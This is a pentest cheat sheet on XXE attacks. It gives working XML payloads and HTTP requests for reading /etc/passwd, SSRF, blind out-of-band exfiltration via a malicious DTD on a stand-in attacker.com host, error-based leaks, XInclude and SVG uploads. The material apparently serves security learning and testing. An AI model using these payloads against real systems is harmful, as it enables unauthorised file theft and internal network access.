---
title: "XXE"
weight: 30
description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilities. These pentest notes cover file retrieval, SSRF, blind XXE techniques (OAST, error-based), XInclude, and more attack vectors."
---

# XXE

{{< details summary="Introduction" >}}

**What is XML**

* Some applications use the XML format to transmit data between the browser and the server.
* Its popularity has now declined in favor of the JSON format

**XXE Impact**

* Retrieve files
* Perform SSRF attacks

{{< /details >}}

---

## Retrieve files

1. Introduce (or edit) a `DOCTYPE` element defining an external entity with the file path.
2. Edit a data value in the XML returned in the app's response to use the defined external entity.

{{< hint style=notes >}}
To systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.
{{< /hint >}}

***

**Original**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck> 
```

**Exploitation**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

---

## Perform SSRF attacks

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
```

---

## Blind XXE

### Out-of-band (OAST) techniques

**Detection**

* Detecting as SSRF
  * ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
    ```
* Regular entities are blocked? Bypass via XML parameter entities
  * ```xml
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
    ```
  * This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD

**Exploitation**

1. Start a web server and host on `http://attacker.com/example.dtd` this malicious dtd.

    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
    %stack;
    %exfil;
    ```

2. Add this external entity

    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/example.dtd"> %xxe;]>
    ```

{{< hint style=notes >}}
This technique might not work with multiline files.
{{< /hint >}}

### Via error messages

Trigger an XML parsing error message with the file contents.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

{{< hint style=notes >}}
This works if you notice an error in the response when detecting with OAST (e.g., the reflected URL entered).
{{< /hint >}}

---

## Hidden attack surface

* **First case** - Requests that contain data in XML format
* **Second case -** Requests that do not contain any XML
  * **Detection**: Add entity reference that doesn't exist to cause an error  -> ok it's XML

### XInclude attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document.

`XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

```http
POST /product/stock HTTP/2
Host: vulnerable.website.com
[...]

productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude">
<xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```

### Via file upload

Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

This works if it's used image processing library & support SVG images & allow external entity.

### Via modified content type

Some web app will tolerate other content types.

**Expected request**

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

**Submit following request**

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
